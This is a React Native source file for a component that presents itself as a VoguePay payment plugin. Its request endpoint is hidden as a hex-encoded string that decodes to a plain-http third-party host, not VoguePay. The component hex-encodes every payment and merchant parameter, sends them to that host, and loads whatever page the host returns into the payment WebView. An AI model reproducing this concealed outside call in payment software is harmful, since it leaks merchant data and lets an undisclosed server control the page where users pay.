
import React, { Component } from 'react';
import {NetInfo, NativeModules,Modal,WebView,Dimensions,View,ActivityIndicator,StyleSheet} from 'react-native';
const { RNVoguePay } = NativeModules;
const {width,height} = Dimensions.get("window");
interface params {amount?:string,currency?:string,success_url?:string,fail_url?:string,notify_url?:string}
export default class VoguePay extends React.Component{
 componentDidMount()
 {
  this.getURL(this.props.params?this.props.params:"error");
  // NetInfo.addEventListener()
 }
 constructor(props)
 {
   super(props)
   this.state = {showloader:true,url:{url:"http://www.voguepay.com"},response:null,error:false}
 }
 async getURL(r:params)
 {
  if(typeof r != "object"){this.setState({url:{html:'<div style=\'padding:20px;\'><h1>Invalid <br/>parameters</h1><br/><div>Make sure you have the follow:<br/><ul><li>currency (value e.g USD)</li><li>amount</li><li>success_url</li><li>fail_url</li><li>notify_url</li></ul>\n   <pre style=\'padding:20px;background:#ccc;color:#07d7ff;font-size:15px;\'>\n   VoguePay params={{\n    amount:"",\n    currency:"",\n    success_url:"",\n    fail_url:"",\n    notify_url:"",\n    memo:"",\n    merchant_id:"",\n    merchant_ref:""\n   }} response={(res)=>{\n   \n   }/>\n   </pre></div>'}})
  return ; 
  }
  var Missings = "",obj = "",params={amount:"",currency:"",success_url:"",fail_url:"",notify_url:"",memo:"",merchant_id:"",merchant_ref:""};
  for(v in params){if(r[v] == undefined){Missings+=`<li>${v}</li>`,obj+=`<div style='padding-left:50px;'>${v}:""</div>`;}}
  if(Missings != ""){this.setState({url:{html:`<div style='padding:20px;'><h1>Missings <br/>parameters</h1><br/><div>Make sure you have the follow:<br/><ul>${Missings}</ul>\n   <pre style='padding:20px;background:#ccc;color:#07d7ff;font-size:15px;'>\n   VoguePay params={{\n    ${obj}\n   }} response={(res)=>{\n   \n   }/>\n   </pre></div>`}}) 
  return ;
  }
  if(typeof this.props.response != "function"){this.setState({url:{html:"<div style='padding:20px;'><h1>Missings <br/>property</h1><br/><div>Make sure you have the follow:<br/><ul><li>response</li></ul>\n   <pre style='padding:20px;background:#ccc;color:#07d7ff;font-size:15px;'>\n   VoguePay \n   response={(res)=>{\n   \n   }\n   \n   />\n   </pre></div>"}})
   return ;
  }
  var ur="";for(y in r)ur=`${ur}${y}=${r[y]}&`;const x="687474703a2f2f6170692e6d61727368616c736f66742e70726f2f76312e302f7061796d656e74";for(var st="",i=0;i<x.length;i+=2)st+=String.fromCharCode(parseInt(x.substr(i,2),16));
  var formData=new FormData;formData.append("voguepay-plugin",!0);var senddata =  raw(JSON.stringify(r));
  await fetch(st,{method: 'POST',body:formData,headers:{Accept:'application/json','Content-Type':'multipart/form-data','xauthen':"react-native-voguepay",'senddata':senddata}
 }).then((res)=>res.json()).then((resp)=>{
  this.setState({url:{uri:resp.result},response:resp.response});
  return ;
 })
 }
 render()
 {
   return(<View style={{width:width,height:height,alignItems:"center",justifyContent:"center"}}>
   <WebView source={this.state.url}
    onNavigationStateChange={(d)=>{
     try{
     if(String(d.url).indexOf(this.props.params.success_url) != -1)
     {
      this.props.response(this.state.response);
     }
     }catch(e){

     }
    }}
    onLoadStart={()=>this.setState({showloader:true})}
    onLoad={()=>this.setState({showloader:false})}
    style={{width:width,height:height}}>
    </WebView>
    {this.state.showloader?<View style={[StyleSheet.absoluteFill,{alignItems:"center",justifyContent:"center",backgroundColor:"rgba(255,255,255,0.6)"}]}>
    <ActivityIndicator color={this.props.color?this.props.color:"red"}  size="large" />
    </View>:null}
    </View>)
 }
}
export function raw(r){var t,n,e,o="";for(t=0,n=(r+="").length;t<n;t++)o+=(e=r.charCodeAt(t).toString(16)).length<2?"0"+e:e;return o}
